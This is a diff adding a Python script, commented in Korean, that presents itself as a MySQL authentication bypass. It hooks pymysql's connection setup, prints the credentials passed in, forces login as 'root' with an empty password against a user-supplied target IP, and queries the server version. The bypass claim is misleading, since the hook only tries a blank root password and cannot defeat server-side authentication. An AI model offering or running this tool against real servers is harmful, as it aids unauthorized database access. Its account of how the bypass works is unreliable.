@@ -1,0 +1,59 @@
+import pymysql
+from unittest.mock import patch
+
+# 후킹 함수: 인증 절차 우회
+def bypass_auth_init(self, host=None, user=None, password='', database=None, port=3306, *args, **kwargs):
+    print("[!] 후킹된 연결 함수 실행됨")
+    print(f"  - 원래 사용자: {user}")
+    print(f"  - 원래 비밀번호: {password}")
+
+    # 인증 정보를 강제로 변경
+    kwargs['host'] = host or '127.0.0.1'
+    kwargs['user'] = 'root'  # 강제 사용자
+    kwargs['password'] = ''  # 비밀번호 무시
+    kwargs['database'] = database
+    kwargs['port'] = port
+
+    # 원래 초기화 함수 호출
+    original_init(self, **kwargs)
+
+# pymysql.Connection.__init__ 후킹
+original_init = pymysql.connections.Connection.__init__
+pymysql.connections.Connection.__init__ = bypass_auth_init
+
+# 클라이언트 접속 함수
+def connect_to_mysql(target_host, target_port=3306, target_db=None):
+    try:
+        print(f"\n[+] {target_host}:{target_port}에 접속 시도 중...")
+        conn = pymysql.connect(
+            host=target_host,
+            port=target_port,
+            user='dummy_user',     # 후킹에 의해 무시됨
+            password='wrong_pass', # 후킹에 의해 무시됨
+            database=target_db
+        )
+        print("[✓] 접속 성공!")
+        return conn
+    except Exception as e:
+        print(f"[✗] 접속 실패: {e}")
+        return None
+
+# 메인 실행
+if __name__ == "__main__":
+    TARGET_HOST = input("접속할 MySQL 서버 IP 입력: ").strip()
+    TARGET_PORT = int(input("포트 입력 (기본 3306): ") or "3306")
+    TARGET_DB = input("접속할 DB명 (없으면 Enter): ").strip() or None
+
+    connection = connect_to_mysql(TARGET_HOST, TARGET_PORT, TARGET_DB)
+
+    if connection:
+        try:
+            with connection.cursor() as cursor:
+                cursor.execute("SELECT VERSION();")
+                result = cursor.fetchone()
+                print(f"MySQL 버전: {result[0]}")
+        except Exception as e:
+            print("쿼리 실행 오류:", e)
+        finally:
+            connection.close()
+            print("[-] 연결 종료됨")
